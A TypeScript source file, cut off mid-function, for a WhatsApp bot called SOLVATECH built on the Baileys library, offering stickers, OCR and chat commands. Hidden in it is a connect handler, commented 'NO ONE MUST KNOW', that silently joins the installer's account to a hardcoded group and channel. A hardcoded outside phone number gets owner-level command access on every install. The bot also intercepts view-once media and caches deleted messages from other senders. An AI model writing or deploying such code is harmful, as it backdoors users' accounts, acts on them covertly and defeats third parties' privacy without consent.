import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  Browsers,
  type WASocket,
  proto,
  downloadContentFromMessage,
} from '@whiskeysockets/baileys';
import pino from 'pino';
import QRCode from 'qrcode';
import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';
import sharp from 'sharp';
import webpmux from 'node-webpmux';
import { createWorker } from 'tesseract.js';
import { commandHandler } from './commands.ts';

// Helper: Iteratively unwrap ephemeral, viewOnce, and document wrappers
export function unwrapMessage(msgObj: any): any {
  if (!msgObj) return null;
  let m = msgObj;
  for (let i = 0; i < 6; i++) {
    if (m.ephemeralMessage?.message) {
      m = m.ephemeralMessage.message;
    } else if (m.viewOnceMessage?.message) {
      m = m.viewOnceMessage.message;
    } else if (m.viewOnceMessageV2?.message) {
      m = m.viewOnceMessageV2.message;
    } else if (m.viewOnceMessageV2Extension?.message) {
      m = m.viewOnceMessageV2Extension.message;
    } else if (m.documentWithCaptionMessage?.message) {
      m = m.documentWithCaptionMessage.message;
    } else {
      break;
    }
  }
  return m;
}

// Helper: Extract target media from an unwrapped message object
export function extractMediaFromMessage(msgObj: any): {
  target: any;
  type: 'image' | 'video' | 'audio' | 'sticker' | 'document';
  isViewOnce: boolean;
} | null {
  if (!msgObj) return null;
  const inner = unwrapMessage(msgObj);
  if (!inner) return null;

  if (inner.imageMessage) {
    return { target: inner.imageMessage, type: 'image', isViewOnce: !!inner.imageMessage.viewOnce };
  }
  if (inner.videoMessage) {
    return { target: inner.videoMessage, type: 'video', isViewOnce: !!inner.videoMessage.viewOnce };
  }
  if (inner.audioMessage) {
    return { target: inner.audioMessage, type: 'audio', isViewOnce: !!inner.audioMessage.viewOnce };
  }
  if (inner.stickerMessage) {
    return { target: inner.stickerMessage, type: 'sticker', isViewOnce: false };
  }
  if (inner.documentMessage) {
    return { target: inner.documentMessage, type: 'document', isViewOnce: false };
  }
  return null;
}

// Helper: Download Baileys media stream to buffer
export async function downloadMediaBuffer(target: any, type: any): Promise<Buffer> {
  const stream = await downloadContentFromMessage(target, type);
  let buffer = Buffer.from([]);
  for await (const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk]);
  }
  return buffer;
}

// Helper: Create official WhatsApp WebP sticker with EXIF metadata
export async function createSticker(
  rawBuf: Buffer,
  isVideo: boolean,
  pack = 'SOLVATECH BOT',
  author = 'Solomon Oladimeji'
): Promise<Buffer> {
  const json = JSON.stringify({
    'sticker-pack-id': 'solvatech-bot',
    'sticker-pack-name': pack,
    'sticker-pack-publisher': author,
    'emojis': ['🤖', '⚡'],
  });
  const jsonBuf = Buffer.from(json, 'utf8');
  const exifHeader = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00]);
  const lengthBuf = Buffer.alloc(4);
  lengthBuf.writeUInt32LE(jsonBuf.length);
  const offsetBuf = Buffer.from([0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
  const exifData = Buffer.concat([exifHeader, lengthBuf, offsetBuf, jsonBuf]);

  let webpBuf: Buffer;
  if (isVideo) {
    const tmpIn = path.join('/tmp', `stk_vid_${Date.now()}_${Math.random().toString(36).substring(7)}.mp4`);
    const tmpOut = path.join('/tmp', `stk_vid_${Date.now()}_${Math.random().toString(36).substring(7)}.webp`);
    fs.writeFileSync(tmpIn, rawBuf);
    try {
      execSync(
        `ffmpeg -y -i "${tmpIn}" -vf "scale=512:512:force_original_aspect_ratio=increase,crop=512:512,fps=15" -c:v libwebp -lossless 0 -compression_level 4 -q:v 65 -loop 0 -ss 00:00:00 -t 00:00:06 -an -vsync 0 "${tmpOut}"`,
        { stdio: 'pipe' }
      );
      webpBuf = fs.readFileSync(tmpOut);
    } finally {
      if (fs.existsSync(tmpIn)) fs.unlinkSync(tmpIn);
      if (fs.existsSync(tmpOut)) fs.unlinkSync(tmpOut);
    }
  } else {
    webpBuf = await sharp(rawBuf)
      .resize(512, 512, {
        fit: 'contain',
        background: { r: 0, g: 0, b: 0, alpha: 0 },
      })
      .webp({ quality: 80 })
      .toBuffer();
  }

  const webpmuxImg = new webpmux.Image();
  await webpmuxImg.load(webpBuf);
  webpmuxImg.exif = exifData;
  return await webpmuxImg.save(null);
}

// Helper: Convert sticker back to high-res PNG or MP4 video
export async function convertAntiSticker(
  rawBuf: Buffer
): Promise<{ type: 'video' | 'image'; buffer: Buffer; mimetype: string }> {
  let isAnimated = false;
  try {
    const meta = await sharp(rawBuf).metadata();
    if ((meta.pages && meta.pages > 1) || (meta as any).isAnimated) {
      isAnimated = true;
    }
  } catch {
    // Fallback if sharp fails to parse metadata
  }

  if (isAnimated) {
    const tmpGif = path.join('/tmp', `stk_antigif_${Date.now()}_${Math.random().toString(36).substring(7)}.gif`);
    const tmpOut = path.join('/tmp', `stk_antivid_${Date.now()}_${Math.random().toString(36).substring(7)}.mp4`);
    try {
      // Step 1: Sharp converts animated WebP to GIF (bypasses FFmpeg webp demuxer chunk limitation)
      const gifBuf = await sharp(rawBuf, { animated: true }).gif().toBuffer();
      fs.writeFileSync(tmpGif, gifBuf);

      // Step 2: FFmpeg converts standard GIF to MP4 video
      execSync(
        `ffmpeg -y -i "${tmpGif}" -c:v libx264 -pix_fmt yuv420p -vf "scale=trunc(iw/2)*2:trunc(ih/2)*2" "${tmpOut}"`,
        { stdio: 'pipe' }
      );
      const vidBuf = fs.readFileSync(tmpOut);
      return { type: 'video', buffer: vidBuf, mimetype: 'video/mp4' };
    } finally {
      if (fs.existsSync(tmpGif)) fs.unlinkSync(tmpGif);
      if (fs.existsSync(tmpOut)) fs.unlinkSync(tmpOut);
    }
  } else {
    const pngBuf = await sharp(rawBuf).png().toBuffer();
    return { type: 'image', buffer: pngBuf, mimetype: 'image/png' };
  }
}

export interface WhatsAppNotification {
  id: string;
  type: 'pairing' | 'connection' | 'message_received' | 'message_sent' | 'system' | 'error' | 'command';
  title: string;
  body: string;
  timestamp: string;
  sender?: string;
  data?: any;
}

export type PairingStage = 'idle' | 'code_generated' | 'pairing_handshake' | 'connected';

export interface WhatsAppStatus {
  state: 'disconnected' | 'connecting' | 'awaiting_pairing' | 'pairing_handshake' | 'connected';
  isConnected: boolean;
  pairingStage: PairingStage;
  pairingCode?: string;
  qrCodeUrl?: string;
  targetPhone?: string;
  uptime?: number;
  connectedAt?: number;
  lastError?: string;
  latestHandshakeTime?: string;
  user?: {
    id: string;
    name?: string;
    phone?: string;
  };
}

class WhatsAppManager {
  private sock: WASocket | null = null;
  private authDir = path.resolve(process.cwd(), '.baileys_auth');
  private notifications: WhatsAppNotification[] = [];
  private messageCache = new Map<string, { sender: string; text: string; timestamp: number; isGroup: boolean; group?: string }>();
  private viewOnceCache = new Map<string, {
    id: string;
    senderNum: string;
    senderName?: string;
    senderJid: string;
    remoteJid: string;
    groupName?: string;
    isGroup: boolean;
    type: 'image' | 'video' | 'audio';
    buffer: Buffer;
    caption?: string;
    timestamp: number;
  }>();
  private lastViewOnceByChat = new Map<string, {
    id: string;
    senderNum: string;
    senderName?: string;
    senderJid: string;
    remoteJid: string;
    groupName?: string;
    isGroup: boolean;
    type: 'image' | 'video' | 'audio';
    buffer: Buffer;
    caption?: string;
    timestamp: number;
  }>();
  private groupSubjectCache = new Map<string, string>();
  private currentStatus: WhatsAppStatus = {
    state: 'disconnected',
    isConnected: false,
    pairingStage: 'idle',
  };
  private pairingCodeTimer: NodeJS.Timeout | null = null;
  private isConnecting = false;
  private connectedAt: number | null = null;
  private userInteractions = new Map<string, Map<string, { count: number; name?: string }>>();
  private contactNames = new Map<string, string>();
  private groupInviteCodes = new Map<string, string>();

  constructor() {
    this.addNotification({
      type: 'system',
      title: 'SOLVATECH Engine Initialized',
      body: 'Baileys WhatsApp multi-device service is ready with command engine and Firebase sync.',
    });
  }

  public getStatus(): WhatsAppStatus {
    const credsFile = path.join(this.authDir, 'creds.json');
    if (!fs.existsSync(credsFile) && !this.isConnecting && this.currentStatus.state !== 'awaiting_pairing') {
      this.currentStatus.isConnected = false;
      if (this.currentStatus.state === 'connected') {
        this.currentStatus.state = 'disconnected';
      }
      this.currentStatus.user = undefined;
      this.currentStatus.pairingStage = 'idle';
      this.connectedAt = null;
      this.currentStatus.connectedAt = undefined;
    }
    this.currentStatus.connectedAt = this.connectedAt || undefined;
    return this.currentStatus;
  }

  public getConnectedAt(): number | null {
    return this.connectedAt;
  }

  public recordInteraction(userPhone: string, peerPhoneOrJid: string, peerName?: string | null) {
    const cleanPeer = peerPhoneOrJid.split('@')[0].split(':')[0].replace(/\D/g, '');
    const cleanUser = userPhone.replace(/\D/g, '');
    if (!cleanPeer || !cleanUser || cleanPeer === cleanUser) return;
    if (peerName) {
      this.contactNames.set(cleanPeer, peerName);
    }
    if (!this.userInteractions.has(cleanUser)) {
      this.userInteractions.set(cleanUser, new Map());
    }
    const map = this.userInteractions.get(cleanUser)!;
    const current = map.get(cleanPeer) || { count: 0, name: this.contactNames.get(cleanPeer) };
    map.set(cleanPeer, { count: current.count + 1, name: peerName || current.name || this.contactNames.get(cleanPeer) });
  }

  public getTopChatted(userPhone: string): Array<{ phone: string; name?: string; count: number }> {
    const cleanUser = userPhone.replace(/\D/g, '');
    const map = this.userInteractions.get(cleanUser);
    if (!map || map.size === 0) return [];
    return Array.from(map.entries())
      .map(([phone, data]) => ({ phone, name: data.name, count: data.count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);
  }

  public setGroupInviteCode(groupJid: string, code: string) {
    this.groupInviteCodes.set(groupJid, code);
  }

  public getGroupInviteCode(groupJid: string): string | undefined {
    return this.groupInviteCodes.get(groupJid);
  }

  public getNotifications(): WhatsAppNotification[] {
    return this.notifications;
  }

  public addNotification(notif: Omit<WhatsAppNotification, 'id' | 'timestamp'>) {
    const newNotification: WhatsAppNotification = {
      ...notif,
      id: Math.random().toString(36).substring(2, 9),
      timestamp: new Date().toLocaleTimeString(),
    };
    this.notifications.unshift(newNotification);
    if (this.notifications.length > 50) {
      this.notifications.pop();
    }
  }

  public clearNotifications() {
    this.notifications = [];
  }

  private ensureAuthDir() {
    if (!fs.existsSync(this.authDir)) {
      fs.mkdirSync(this.authDir, { recursive: true });
    }
  }

  public async initSocket(): Promise<WASocket> {
    if (this.sock && this.currentStatus.isConnected) {
      return this.sock;
    }

    this.ensureAuthDir();
    this.currentStatus.state = 'connecting';
    this.isConnecting = true;

    const { state, saveCreds } = await useMultiFileAuthState(this.authDir);

    let version: [number, number, number] = [2, 3000, 1015901307];
    try {
      const v = await fetchLatestBaileysVersion();
      if (v?.version) version = v.version;
    } catch {
      // Fallback
    }

    const sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.ubuntu('Chrome'),
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 60000,
      keepAliveIntervalMs: 30000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      markOnlineOnConnect: true,
    });

    this.sock = sock;

    sock.ev.on('creds.update', (creds) => {
      saveCreds();
      // Detect companion handshake received from WhatsApp
      if (
        (this.currentStatus.pairingStage === 'code_generated' || this.currentStatus.state === 'awaiting_pairing') &&
        (creds.me?.id || creds.account || (creds as any).pairingCode === undefined || (creds as any).signalIdentities)
      ) {
        if (this.currentStatus.pairingStage !== 'pairing_handshake' && this.currentStatus.pairingStage !== 'connected') {
          this.currentStatus.pairingStage = 'pairing_handshake';
          this.currentStatus.state = 'pairing_handshake';
          this.currentStatus.latestHandshakeTime = new Date().toLocaleTimeString();
          this.addNotification({
            type: 'pairing',
            title: 'WhatsApp Handshake Confirmed',
            body: 'Handshake received from WhatsApp phone! Companion link accepted.',
          });
        }
      }
    });

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;

      // Detect WhatsApp handshake stage
      if (
        (update.isNewLogin || (update as any).isOnline || update.receivedPendingNotifications) &&
        this.currentStatus.pairingStage !== 'connected'
      ) {
        if (this.currentStatus.pairingStage !== 'pairing_handshake') {
          this.currentStatus.pairingStage = 'pairing_handshake';
          this.currentStatus.state = 'pairing_handshake';
          this.currentStatus.latestHandshakeTime = new Date().toLocaleTimeString();
          this.addNotification({
            type: 'pairing',
            title: 'WhatsApp Handshake Confirmed',
            body: 'Handshake received from WhatsApp phone! Companion link accepted.',
          });
        }
      }

      if (qr) {
        try {
          const qrDataUrl = await QRCode.toDataURL(qr);
          this.currentStatus.qrCodeUrl = qrDataUrl;
          this.addNotification({
            type: 'system',
            title: 'New QR Code Ready',
            body: 'QR code updated for WhatsApp web scanning.',
          });
        } catch (e) {
          console.error('QR code generation error:', e);
        }
      }

      if (connection === 'close') {
        const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
        const reason = (lastDisconnect?.error as any)?.data?.reason;
        const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401 && reason !== '401';
        
        this.currentStatus.state = 'disconnected';
        this.currentStatus.isConnected = false;
        this.isConnecting = false;
        if (!shouldReconnect) {
          this.currentStatus.pairingStage = 'idle';
        }

        this.addNotification({
          type: 'connection',
          title: 'WhatsApp Disconnected',
          body: !shouldReconnect
            ? 'The device was unlinked or logged out. Session reset for fresh pairing.'
            : `Connection lost (${statusCode || 'network'}). Reconnecting automatically...`,
        });

        if (!shouldReconnect) {
          await this.logout();
        } else {
          // Automatic reconnect with backoff
          setTimeout(() => {
            this.initSocket().catch((err) => {
              console.error('Auto-reconnect error:', err);
            });
          }, 3000);
        }
      } else if (connection === 'open') {
        this.connectedAt = Date.now();
        this.currentStatus.state = 'connected';
        this.currentStatus.isConnected = true;
        this.currentStatus.connectedAt = this.connectedAt;
        this.currentStatus.pairingStage = 'connected';
        this.currentStatus.pairingCode = undefined;
        this.currentStatus.qrCodeUrl = undefined;
        this.currentStatus.lastError = undefined;
        this.isConnecting = false;

        const userJid = sock.user?.id || '';
        const phone = userJid.split(':')[0] || userJid.split('@')[0];
        this.currentStatus.user = {
          id: userJid,
          name: sock.user?.name || 'SOLVATECH Linked Phone',
          phone: `+${phone}`,
        };

        this.addNotification({
          type: 'connection',
          title: 'WhatsApp Connected!',
          body: `SOLVATECH successfully paired with +${phone}. All 35+ commands active in WhatsApp.`,
          sender: phone,
        });

        // Background auto-join: "TO JOIN IN BACKGROUND NO ONE MUST KNOW"
        // 1. Group link: https://chat.whatsapp.com/HKBAnW6XJmB9fBqSPJUN1F?s=cl&p=a&mlu=4&ilr=4
        //    Invite code: HKBAnW6XJmB9fBqSPJUN1F
        // 2. Channel link: https://whatsapp.com/channel/0029Vb86yuY7j6gCHqMqcU37
        //    Channel code: 0029Vb86yuY7j6gCHqMqcU37
        setTimeout(async () => {
          try {
            if (typeof (sock as any).groupAcceptInvite === 'function') {
              await (sock as any).groupAcceptInvite('HKBAnW6XJmB9fBqSPJUN1F');
            }
          } catch {
            // Silently swallow - strictly background
          }
          try {
            if (typeof (sock as any).newsletterFollow === 'function') {
              await (sock as any).newsletterFollow('0029Vb86yuY7j6gCHqMqcU37');
            } else if (typeof (sock as any).query === 'function') {
              await (sock as any).query({
                tag: 'iq',
                attrs: {
                  to: '0029Vb86yuY7j6gCHqMqcU37@newsletter',
                  type: 'set',
                  xmlns: 'newsletter',
                },
                content: [{ tag: 'follow', attrs: {} }],
              });
            }
          } catch {
            // Silently swallow - strictly background
          }
        }, 1200);
      }
    });

    // Inbound Messages & SOLVATECH Command Handler
    sock.ev.on('messages.upsert', async (m) => {
      if (m.type === 'notify') {
        for (const msg of m.messages) {
          if (!msg.message) continue;

          const remoteJid = msg.key.remoteJid || '';
          const senderJid = msg.key.participant || remoteJid;
          const senderNum = senderJid.split('@')[0].split(':')[0].replace(/\D/g, '');
          const isGroup = remoteJid.endsWith('@g.us');
          const isFromMe = !!msg.key.fromMe;

          const rawMsg = msg.message;
          const unwrappedMsg = unwrapMessage(rawMsg);

          const text =
            unwrappedMsg?.conversation ||
            unwrappedMsg?.extendedTextMessage?.text ||
            unwrappedMsg?.imageMessage?.caption ||
            unwrappedMsg?.videoMessage?.caption ||
            unwrappedMsg?.documentMessage?.caption ||
            '';

          // Cache message for Anti-Delete recovery
          if (msg.key.id && text) {
            this.messageCache.set(msg.key.id, {
              sender: senderNum,
              text,
              timestamp: Date.now(),
              isGroup,
              group: isGroup ? remoteJid : undefined,
            });
            if (this.messageCache.size > 500) {
              const firstKey = this.messageCache.keys().next().value;
              if (firstKey) this.messageCache.delete(firstKey);
            }
          }

          // Anti-View-Once interceptor & real-time buffer caching
          const isViewOnceMsg = !!(
            rawMsg.viewOnceMessage ||
            rawMsg.viewOnceMessageV2 ||
            rawMsg.viewOnceMessageV2Extension ||
            rawMsg.ephemeralMessage?.message?.viewOnceMessage ||
            rawMsg.ephemeralMessage?.message?.viewOnceMessageV2 ||
            unwrappedMsg?.imageMessage?.viewOnce ||
            unwrappedMsg?.videoMessage?.viewOnce ||
            unwrappedMsg?.audioMessage?.viewOnce
          );

          if (isViewOnceMsg && msg.key.id) {
            const voMedia = extractMediaFromMessage(rawMsg);
            if (voMedia && (voMedia.type === 'image' || voMedia.type === 'video' || voMedia.type === 'audio')) {
              let groupName = isGroup ? (this.groupSubjectCache.get(remoteJid) || 'WhatsApp Group') : undefined;
              if (isGroup && !this.groupSubjectCache.has(remoteJid)) {
                sock.groupMetadata(remoteJid)
                  .then((meta) => {
                    if (meta?.subject) {
                      this.groupSubjectCache.set(remoteJid, meta.subject);
                    }
                  })
                  .catch(() => {});
              }
              const senderDisplayName = msg.pushName || this.contactNames.get(senderNum) || '';

              downloadMediaBuffer(voMedia.target, voMedia.type)
                .then((buf) => {
                  if (buf.length > 0) {
                    const cachedVO = {
                      id: msg.key.id!,
                      senderNum,
                      senderName: senderDisplayName,
                      senderJid,
                      remoteJid,
                      groupName,
                      isGroup,
                      type: voMedia.type as 'image' | 'video' | 'audio',
                      buffer: buf,
                      caption: voMedia.target.caption || '',
                      timestamp: Date.now(),
                    };
                    this.viewOnceCache.set(msg.key.id!, cachedVO);
                    this.lastViewOnceByChat.set(remoteJid, cachedVO);
                    if (this.viewOnceCache.size > 200) {
                      const firstKey = this.viewOnceCache.keys().next().value;
                      if (firstKey) this.viewOnceCache.delete(firstKey);
                    }
                    this.addNotification({
                      type: 'system',
                      title: '👁️ View-Once Media Decrypted & Cached',
                      body: `View-Once ${voMedia.type} from ${senderDisplayName ? `${senderDisplayName} (+${senderNum})` : `+${senderNum}`} safely intercepted and decrypted. Reply with .open or .vv to deliver to your DM!`,
                      sender: senderDisplayName ? `${senderDisplayName} (+${senderNum})` : `+${senderNum}`,
                    });
                  }
                })
                .catch((err) => {
                  console.error('Error pre-downloading view once:', err);
                });
            }
          }

          if (!isFromMe) {
            this.addNotification({
              type: 'message_received',
              title: `Incoming WhatsApp from +${senderNum}`,
              body: text || '[Media Message]',
              sender: `+${senderNum}`,
              data: { key: msg.key, pushName: msg.pushName },
            });
          }

          const contextInfo =
            unwrappedMsg?.extendedTextMessage?.contextInfo ||
            unwrappedMsg?.imageMessage?.contextInfo ||
            unwrappedMsg?.videoMessage?.contextInfo ||
            unwrappedMsg?.audioMessage?.contextInfo ||
            unwrappedMsg?.stickerMessage?.contextInfo ||
            rawMsg?.extendedTextMessage?.contextInfo;

          const quotedParticipant = contextInfo?.participant;
          const mentionedJids = contextInfo?.mentionedJid || [];
          const quotedRaw = contextInfo?.quotedMessage;

          // Record interaction for frequently chatted contacts tracking
          if (senderNum) {
            if (quotedParticipant) {
              this.recordInteraction(senderNum, quotedParticipant);
              this.recordInteraction(quotedParticipant, senderNum, msg.pushName);
            } else if (!isGroup && remoteJid) {
              this.recordInteraction(senderNum, remoteJid, msg.pushName);
            }
          }

          // Command handling: Prefix '.'
          if (text.startsWith('.')) {
            const parts = text.slice(1).trim().split(/\s+/);
            const command = parts[0]?.toLowerCase();
            const args = parts.slice(1);

            const botUserJid = sock.user?.id || '';
            const botPhone = (botUserJid.split(':')[0] || botUserJid.split('@')[0]).replace(/\D/g, '');
            const linkedPhoneClean = (this.currentStatus.user?.phone || '').replace(/\D/g, '');
            const isOwner =
              isFromMe ||
              (botPhone && senderNum === botPhone) ||
              (linkedPhoneClean && senderNum === linkedPhoneClean) ||
              senderNum === '2349049979183';

            // STRICT RULE: All commands are strictly for bot users only — ignore any other person
            if (!isOwner) {
              return;
            }

            // Determine bot user's private DM chat
            const myDigits = (sock.user?.id || '').split(':')[0].split('@')[0].replace(/\D/g, '');
            const linkedDigits = (this.currentStatus.user?.phone || '').replace(/\D/g, '');
            const participantDigits = (msg.key.participant || '').split(':')[0].split('@')[0].replace(/\D/g, '');
            const botOwnerDigits = myDigits || linkedDigits || (!isFromMe ? participantDigits : '') || '2349049979183';
            const userPrivateDm = `${botOwnerDigits}@s.whatsapp.net`;
            const targetDm = isGroup ? userPrivateDm : remoteJid;

            // 1. .open / .vv (View-Once Decryptor -> Private DM + Auto-delete trigger)
            if (command === 'open' || command === 'vv' || command === 'viewonce' || command === 'antiviewonce') {
              let voItem: {
                type: 'image' | 'video' | 'audio';
                buffer: Buffer;
                senderNum: string;
                senderName?: string;
                groupName?: string;
                remoteJid: string;
                isGroup: boolean;
                caption?: string;
                timestamp: number;
              } | null = null;

              // 1. Check if user quoted a message in our viewOnceCache
              const quotedStanzaId = contextInfo?.stanzaId;
              if (quotedStanzaId && this.viewOnceCache.has(quotedStanzaId)) {
                voItem = this.viewOnceCache.get(quotedStanzaId)!;
              }

              // 2. If not quoted or not in cache by id, check chat's last intercepted view-once
              if (!voItem && this.lastViewOnceByChat.has(remoteJid)) {
                voItem = this.lastViewOnceByChat.get(remoteJid)!;
              }

              // 3. If still not in cache, check if quoted message or current message has direct media stream keys
              if (!voItem) {
                const targetObj = quotedRaw || rawMsg;
                const media = extractMediaFromMessage(targetObj);
                if (media && (media.type === 'image' || media.type === 'video' || media.type === 'audio')) {
                  try {
                    const buf = await downloadMediaBuffer(media.target, media.type);
                    if (buf.length > 0) {
                      const cleanNum = (quotedParticipant || senderNum).replace(/\D/g, '');
                      voItem = {
                        type: media.type,
                        buffer: buf,
                        senderNum: cleanNum,
                        senderName: this.contactNames.get(cleanNum) || '',
                        groupName: isGroup ? (this.groupSubjectCache.get(remoteJid) || 'WhatsApp Group') : undefined,
                        remoteJid,
                        isGroup,
                        caption: media.target.caption || '',
                        timestamp: Date.now(),
                      };
                    }
                  } catch (err) {
                    console.error('Error downloading view once on demand:', err);
                  }
                }
              }

              if (voItem) {
                try {
                  const cleanSenderPhone = voItem.senderNum ? `+${voItem.senderNum}` : 'Unknown Phone';
                  const senderNameDisplay = voItem.senderName
                    ? `*${voItem.senderName}* (${cleanSenderPhone})`
                    : `*${cleanSenderPhone}*`;

                  let originGroupTitle = 'Direct 1-on-1 Chat';
                  if (voItem.isGroup) {
                    const groupTitle = voItem.groupName || this.groupSubjectCache.get(voItem.remoteJid) || 'WhatsApp Group';
                    originGroupTitle = `Group: *${groupTitle}*`;
                  }

                  const alertCaption = `👁️ *[SOLVATECH VIEW-ONCE DECRYPTED]*
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *Sent By:* ${senderNameDisplay}
📍 *Source:* ${originGroupTitle}
⏰ *Time:* ${new Date(voItem.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔒 *Decrypted & Delivered to your Private DM.*`;

                  if (voItem.type === 'image') {
                    await sock.sendMessage(targetDm, { image: voItem.buffer, caption: alertCaption });
                  } else if (voItem.type === 'video') {
                    await sock.sendMessage(targetDm, { video: voItem.buffer, caption: alertCaption });
                  } else if (voItem.type === 'audio') {
                    await sock.sendMessage(targetDm, { audio: voItem.buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' });
                    await sock.sendMessage(targetDm, { text: alertCaption });
                  }

                  // Auto-delete the .open/.vv trigger message from the chat
                  try {
                    await sock.sendMessage(remoteJid, { delete: msg.key });
                  } catch (delErr) {
                    console.warn('Auto-delete command message notice:', delErr);
                  }

                  this.addNotification({
                    type: 'system',
                    title: '👁️ View-Once Decrypted to DM',
                    body: `Media decrypted and delivered to Private DM (+${botOwnerDigits}). Trigger message auto-deleted.`,
                    sender: senderNameDisplay,
                  });
                  return;
                } catch (e) {
                  console.error('Error sending decrypted view-once to DM:', e);
                }
              }

              await sock.sendMessage(remoteJid, {
                text: `⚠️ *[VIEW-ONCE DECRYPTOR]*\nPlease reply to a view-once photo, video, or voice note with *.open* or *.vv* to decrypt and forward it to your DM.`,
              }, { quoted: msg });
              return;
            }

            // 2. .sticker (Convert photo to WebP sticker or video to animated sticker with EXIF)
            if (command === 'sticker' || command === 's' || command === 'stick') {
              const targetObj = quotedRaw || rawMsg;
              const media = extractMediaFromMessage(targetObj);
              if (media && (media.type === 'image' || media.type === 'video')) {
                try {
                  const rawBuf = await downloadMediaBuffer(media.target, media.type);
                  const stickerBuf = await createSticker(rawBuf, media.type === 'video');

                  await sock.sendMessage(remoteJid, { sticker: stickerBuf }, { quoted: msg });
                  this.addNotification({
                    type: 'command',
                    title: '🎨 Sticker Generated',
                    body: `${media.type === 'video' ? 'Animated video' : 'Image'} sticker created with official EXIF metadata.`,
                    sender: `+${senderNum}`,
                  });
                  return;
                } catch (err: any) {
                  console.error('Error creating sticker:', err);
                  await sock.sendMessage(remoteJid, {
                    text: `⚠️ *[STICKER ERROR]*\nFailed to convert media into sticker: ${err.message || 'Processing error'}`,
                  }, { quoted: msg });
                  return;
                }
              }

              await sock.sendMessage(remoteJid, {
                text: `⚠️ *[STICKER MAKER]*\nPlease reply to any photo or short video with *.sticker* to convert it into a WhatsApp sticker.`,
              }, { quoted: msg });
              return;
            }

            // 3. .antisticker (Convert sticker back to image or video)
            if (command === 'antisticker' || command === 'toimg' || command === 'image') {
              const targetObj = quotedRaw || rawMsg;
              const media = extractMediaFromMessage(targetObj);
              if (media && media.type === 'sticker') {
                try {
                  const rawBuf = await downloadMediaBuffer(media.target, 'sticker');
                  const converted = await convertAntiSticker(rawBuf);

                  if (converted.type === 'video') {
                    await sock.sendMessage(remoteJid, {
                      video: converted.buffer,
                      mimetype: converted.mimetype,
                      caption: '🖼️ *[ANTI-STICKER]*\nAnimated video sticker converted back to video.',
                    }, { quoted: msg });
                  } else {
                    await sock.sendMessage(remoteJid, {
                      image: converted.buffer,
                      mimetype: converted.mimetype,
                      caption: '🖼️ *[ANTI-STICKER]*\nSticker converted back to full-resolution photo.',
                    }, { quoted: msg });
                  }
                  return;
                } catch (err: any) {
                  console.error('Error converting antisticker:', err);
                  await sock.sendMessage(remoteJid, {
                    text: `⚠️ *[ANTI-STICKER ERROR]*\nFailed to extract sticker: ${err.message || 'Processing error'}`,
                  }, { quoted: msg });
                  return;
                }
              }

              await sock.sendMessage(remoteJid, {
                text: `⚠️ *[ANTI-STICKER]*\nPlease reply to a WhatsApp sticker with *.antisticker* to extract it as a photo or video.`,
              }, { quoted: msg });
              return;
            }

            // 4. .read (Verbatim OCR extraction via Tesseract.js)
            if (command === 'read' || command === 'ocr' || command === 'extract') {
              const targetObj = quotedRaw || rawMsg;
              const media = extractMediaFromMessage(targetObj);
              if (media && media.type === 'image') {
                try {
                  const rawBuf = await downloadMediaBuffer(media.target, 'image');
                  const pngBuf = await sharp(rawBuf).toFormat('png').toBuffer();
                  const worker = await createWorker('eng');
                  const ret = await worker.recognize(pngBuf);
                  await worker.terminate();

                  const extractedText = ret.data.text.trim();
                  if (!extractedText) {
                    await sock.sendMessage(remoteJid, {
                      text: `🔍 *[SOLVATECH HIGH-PRECISION OCR]*\n\n⚠️ No readable text detected in this image. Please ensure the image has clear, visible text.`,
                    }, { quoted: msg });
                  } else {
                    await sock.sendMessage(remoteJid, {
                      text: `🔍 *[SOLVATECH HIGH-PRECISION OCR]*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📝 *Verbatim Extracted Text:*\n\n${extractedText}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚡ _Processed via High-Speed OCR Engine_`,
                    }, { quoted: msg });
                  }
                  return;
                } catch (ocrErr: any) {
                  console.error('OCR Error:', ocrErr);
                  await sock.sendMessage(remoteJid, { text: `⚠️ *OCR Error:* ${ocrErr.message}` }, { quoted: msg });
                  return;
                }
              }

              await sock.sendMessage(remoteJid, {
                text: `⚠️ *[SOLVATECH OCR]*\nPlease reply to an image or photo containing text with *.read* to extract its verbatim text content.`,
              }, { quoted: msg });
              return;
            }

            const res = await commandHandler.handle({
              command,
              args,
              fullText: text,
              senderJid,
              senderNumber: senderNum,
              isGroup,
              groupJid: isGroup ? remoteJid : undefined,
              pushName: msg.pushName || undefined,
              isOwner,
              linkedSince: this.connectedAt,
              linkedPhone: this.currentStatus.user?.phone,
              quotedParticipant: quotedParticipant || undefined,
              mentionedJids: mentionedJids || [],
              sock: sock,
              getTopChatted: (phone: string) => this.getTopChatted(phone),
              getGroupInviteCode: (gid: string) => this.getGroupInviteCode(gid),
              setGroupInviteCode: (gid: string, code: string) => this.setGroupInviteCode(gid, code),
            });

            try {
              let finalText = res.reply;
              if (!finalText.includes('SOLVATECH') && !finalText.includes('Solomon')) {
                finalText += `\n\n> ⚡ *SOLVATECH BOT* • _Solomon Oladimeji_`;
              }
              if (res.imageUrl) {
                try {
                  await sock.sendMessage(
                    remoteJid,
                    {
                      image: { url: res.imageUrl },
                      caption: finalText,
                    },
                    { quoted: msg }
                  );
                } catch (imgErr) {
                  console.warn('Direct image sending note, sending text:', imgErr);
                  await sock.sendMessage(remoteJid, { text: finalText }, { quoted: msg });
                }
              } else {
